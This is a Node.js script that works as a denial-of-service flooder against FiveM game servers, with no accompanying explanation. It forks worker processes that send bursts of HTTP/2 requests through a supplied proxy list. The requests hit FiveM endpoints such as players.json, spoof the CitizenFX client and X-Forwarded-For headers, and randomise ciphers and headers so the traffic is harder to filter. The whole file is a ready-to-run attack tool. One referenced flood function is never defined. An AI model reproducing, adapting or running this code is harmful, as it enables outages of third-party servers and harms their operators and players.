const url = require('url'),
fs = require('fs'),
http2 = require('http2'),
http = require('http'),
tls = require('tls'),
cluster = require('cluster'),
args = require('minimist')(process.argv.slice(2)),
cplist = [
    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
    "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
    "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
    "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
    "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK"
],
sigalgs = [
    'ecdsa_secp256r1_sha256',
    'ecdsa_secp384r1_sha384',
    'ecdsa_secp521r1_sha512',
    'rsa_pss_rsae_sha256',
    'rsa_pss_rsae_sha384',
    'rsa_pss_rsae_sha512',
    'rsa_pkcs1_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512',
],
accept_header = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'
],
lang_header = [
    'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
    'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
    'en-US,en;q=0.5',
    'en-US,en;q=0.9',
    'de-CH;q=0.7',
    'da, en-gb;q=0.8, en;q=0.7',
    'cs;q=0.5'
],
encoding_header = [
    'deflate, gzip;q=1.0, *;q=0.5',
    'gzip, deflate, br',
    '*'
],
controle_header = [
    'no-cache',
    'no-store',
    'no-transform',
    'only-if-cached',
    'max-age=0'
],
fivempath = [
    "players.json",
    "profileData.json",
    "perf",
    "infos.json",
    "dynamic.json"
],
uaslist = [
    "CitizenFX/1",

],
ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError'],
ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO'];

process.on('uncaughtException', function (e) {
if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
    // console.warn(e);
}).on('unhandledRejection', function (e) {
if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
    // console.warn(e);
}).on('warning', e => {
if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
    // console.warn(e);
}).setMaxListeners(0);

var log = console.log;

global.logger = function() { 

    var first_parameter = arguments[0];
    var other_parameters = Array.prototype.slice.call(arguments, 1);

    function formatConsoleDate(date) {

        var hour = date.getHours();
        var minutes = date.getMinutes();
        var seconds = date.getSeconds();
        return '\x1b[0m[' + ((hour < 10) ? '0' + hour : hour) +':' +((minutes < 10) ? '0' + minutes : minutes) +':' +((seconds < 10) ? '0' + seconds : seconds) +'] \x1b[38;5;4m=> \x1b[0m';

    }

    log.apply(console, [formatConsoleDate(new Date()) + first_parameter].concat(other_parameters));

};


function accept() {
    return accept_header[Math.floor(Math.random() * accept_header.length)];
}

function lang() {
    return lang_header[Math.floor(Math.random() * lang_header.length)];
}

function encoding() {
    return encoding_header[Math.floor(Math.random() * encoding_header.length)];
}

function controling() {
    return controle_header[Math.floor(Math.random() * controle_header.length)];
}

function fakeua() {
    return uaslist[Math.floor(Math.random() * uaslist.length)];
}

function randompath() {
    return fivempath[Math.floor(Math.random() * fivempath.length)];
}

const target = args["url"], time = args["time"], thread = args["threads"], Tls = args["tls"], proxys = fs.readFileSync(args["proxys"], 'utf-8').toString().match(/\S+/g);

function proxyr() {
    return proxys[Math.floor(Math.random() * proxys.length)];
}

if(cluster.isMaster) {


    for(var bb=0;bb<thread;bb++) {
        cluster.fork();
    }
    

    setTimeout(() => {

        process.exit(-1)
    
    }, time * 1000)

}else {

    if(Tls == "true") {

        for(var z =0;z<200;z++){
            setInterval(() => { floodTLS() })
        }

    }else if(Tls == "false") {

        for(var z =0;z<200;z++){
            setInterval(() => { floodh2() })
        }

    }

    function floodTLS() {

        var parsed = url.parse(target);

        const uas = fakeua();

        var proxy = proxyr().split(':')

        var path = url.parse(target).path + randompath();            

        var header = {
            ":path": path,
            "X-Forwarded-For": proxy[0],
            "X-Forwarded-Host": proxy[0], 
            ":method": "GET",
            "User-agent": uas,
            "Origin": target,
            "Referer" : target,
            "Accept": accept(),
            "Accept-Encoding": encoding(),
            "Accept-Language": lang(),
            "Cache-Control": controling(), 
        }

        const agent = new http.Agent({
            keepAlive: true,
            keepAliveMsecs: 10000,
            maxSockets: 0,
        });
            
        var req = http.get({
            host: proxy[0],
            agent: agent,
            globalAgent: agent,
            port: proxy[1],
            method: 'CONNECT',
            path: parsed.host+':443'
        }, function(){ 
            req.setSocketKeepAlive(true);
        });
    
        req.on('connect', function (res, socket, head) { 
        
            const client = http2.connect(parsed.href, {
                createConnection: () => tls.connect({
                    host: parsed.host,
                    ciphers: tls.getCiphers().join(':')+ cplist.join(':') + ":TLS_AES_128_CCM_SHA256:TLS_AES_128_CCM_8_SHA256"+":HIGH:!aNULL:!kRSA:!MD5:!RC4:!PSK:!SRP:!DSS:!DSA:"+'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
                    secureProtocol: 'TLS_method',
                    TLS_MIN_VERSION: '1.3',
                    TLS_MAX_VERSION: '1.3',
                    servername: parsed.host,
                    secure: true,
                    rejectUnauthorized: false,
                    sigalgs: sigalgs.join(':'),
                    ALPNProtocols: ['h2'],
                    socket: socket
                }, function () {
                    setInterval(() => {

                        for (let i = 0; i< 20; i++){
                            client.request(header);
                        }

                    })
                })
            });
        });

        req.end();

    }


}

